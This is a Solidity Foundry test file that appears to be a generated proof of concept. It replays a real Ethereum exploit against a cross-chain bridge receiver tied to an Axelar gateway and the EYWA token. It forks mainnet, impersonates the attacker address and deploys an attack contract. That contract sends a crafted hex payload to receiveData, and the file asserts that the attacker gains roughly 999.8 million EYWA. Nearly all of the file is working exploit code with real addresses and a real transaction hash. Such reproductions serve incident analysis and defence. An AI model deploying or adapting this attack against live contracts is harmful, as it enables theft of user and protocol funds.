// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x632400f42e96a5deb547a179ca46b02c22cd25cd
// Attack Contract : 0xb2185950f5a0a46687ac331916508aada202e063
// Vulnerable Contract : 0xb2185950f5a0a46687ac331916508aada202e063
// Attack Tx : 0x37d9b911ef710be851a2e08e1cfc61c2544db0f208faeade29ee98cc7506ccc2
// Block : 24363854
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.ReceiverAxelar;
    uint256 constant TX_TIMESTAMP = 1769971103;
    uint256 constant TX_BLOCK_NUMBER = 24363854;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory expressExecuteCall = abi.encodeWithSelector(
            bytes4(0x65657636), Addresses.COMMAND_ID, "berachain", "0x5eEdDcE72530e4fC96d43E3d70Fe09aD0D037175", hex""
        );
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(expressExecuteCall);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.EYWA, "EYWA", 999787453032535443982573983);
    }
}

contract OurAttack {
    function _executeMessage() internal {
        IAxelarGatewayProxyMultisig(Addresses.AxelarGatewayProxyMultisig).isCommandExecuted(Addresses.COMMAND_ID);

        // Structured gap: the handoff reports an unmatched storage write in this frame.
        // It is not replayed because no trace-backed protocol call was provided.
        bytes memory receiveDataPayload =
            hex"000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3792bae7f35dcde2916c6e6a72ccd3a5330d56500000000000000000000000000000000000000000000000000000000000002844dc9fb35105b391f32e7c1e4224ff1a86ab4c6ab0742f5c68f39d485d04b149bda59a97c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000242550000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000008cb8c4263eb26b2349d74ea2cb1b27bc40709e120000000000000000000000000000000000000000033b1666d4acf7d79021f761000000000000000000000000cda36e1b514fcc52e4ca1238491e6e789a11a8bb000000000000000000000000632400f42e96a5deb547a179ca46b02c22cd25cd000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000138de000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000642509db2b4dc9fb3500000000000000000000000000000000000000000000000000000000000000000000000000000000f3792bae7f35dcde2916c6e6a72ccd3a5330d56500000000000000000000000000000000000000000000000000000000000138de00000000000000000000000000000000000000000000000000000000";
        IReceiver(Addresses.Receiver)
            .receiveData(
                bytes32(uint256(uint160(Addresses.Diamond))), 80094, receiveDataPayload, Addresses.RECEIVE_DATA_HASH
            );
    }

    receive() external payable {}

    function expressExecute(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload
    ) external payable {
        commandId;
        sourceChain;
        sourceAddress;
        payload;
        _executeMessage();
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }
}

library Addresses {
    bytes32 internal constant COMMAND_ID = 0x5e77d6809707bb0c062a5c82270d7d939c4ad094dc683ccd4738131925cdeb01;
    bytes32 internal constant RECEIVE_DATA_HASH = 0x105b391f32e7c1e4224ff1a86ab4c6ab0742f5c68f39d485d04b149bda59a97c;
    address internal constant Receiver = 0x0F00F1a6A32e644815C5686aD7dc305A54B11200;
    address internal constant AxelarGatewayProxyMultisig = 0x4F4495243837681061C4743b74B3eEdf548D56A5;
    address internal constant attacker_eoa = 0x632400F42e96A5DEB547a179ca46b02C22CD25cD;
    address internal constant EYWA = 0x8cb8C4263EB26b2349d74ea2cB1B27bc40709e12;
    address internal constant ReceiverAxelar = 0xB2185950F5A0A46687ac331916508aadA202e063;
    address internal constant Diamond = 0xf3792bae7F35DCdE2916c6e6A72cCD3a5330d565;
}

interface IAxelarGatewayProxyMultisig {
    function isCommandExecuted(bytes32) external view returns (uint256);
}

interface IReceiver {
    function receiveData(bytes32, uint64, bytes calldata, bytes32) external;
}
